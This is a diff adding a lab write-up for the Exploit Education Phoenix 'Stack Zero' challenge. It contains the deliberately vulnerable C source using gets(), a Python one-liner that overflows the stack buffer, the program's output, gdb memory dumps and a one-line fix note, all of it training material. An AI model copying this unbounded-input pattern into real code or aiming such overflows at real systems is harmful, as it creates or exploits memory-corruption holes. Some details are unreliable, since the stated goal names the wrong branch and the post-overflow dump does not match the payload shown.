@@ -1,0 +1,80 @@
+# Stack 0
+
+https://exploit.education/phoenix/stack-zero/
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+    "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+int main(int argc, char **argv) {
+    struct {
+        char buffer[64];
+        volatile int changeme;
+    } locals;
+
+    printf("%s\n", BANNER);
+
+    locals.changeme = 0;
+    gets(locals.buffer);
+
+    if (locals.changeme != 0) {
+        puts("Well done, the 'changeme' variable has been changed!");
+    } else {
+        puts(
+            "Uh oh, 'changeme' has not yet been changed. Would you like to try "
+        "again?");
+    }
+
+    exit(0);
+}
+```
+
+The goal of this challenge is to force the program to branch to the else path.
+This can be easily achieved by overwriting the buffer member of the locals struct. By wrting past the bounds (vulnerable function is gets) of buffer, the 32-bit integer changeme can be overwritten.
+
+```
+user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "A"*64 + "B"*4' | ./stack-zero
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed!
+```
+
+# Debugging
+
+Stack before the call to `gets`:
+
+```
+(gdb) x/32xw $esp
+0xffffd554:     0x00000000      0x0000006f      0x00000010      0x080482b4
+0xffffd564:     0x08048551      0x00000000      0x0000004e      0x00000000
+0xffffd574:     0x00000000      0x00000000      0x00000000      0x00000011
+0xffffd584:     0xf7ffd19c      0x00000000      0x08048294      0x00000000
+0xffffd594:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5a4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5b4:     0xffffd5d0      0xffffd650      0xf7f8f654      0xffffd644
+0xffffd5c4:     0x00000002      0xffffd650      0xf7f8f654      0x00000002
+```
+
+After the overflow:
+
+```
+(gdb) x/32xw $esp
+0xffffd550:     0xffffd56c      0x00000000      0x0000006f      0x00000010
+0xffffd560:     0x080482b4      0x08048551      0x00000000      0x41414141
+0xffffd570:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd580:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd590:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd5b0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd5c0:     0x41414141      0x00006141      0xffffd650      0xf7f8f654
+```
+
+# Fix
+
+This vulnerability can be remediated by properly checking the bounds of the input data.
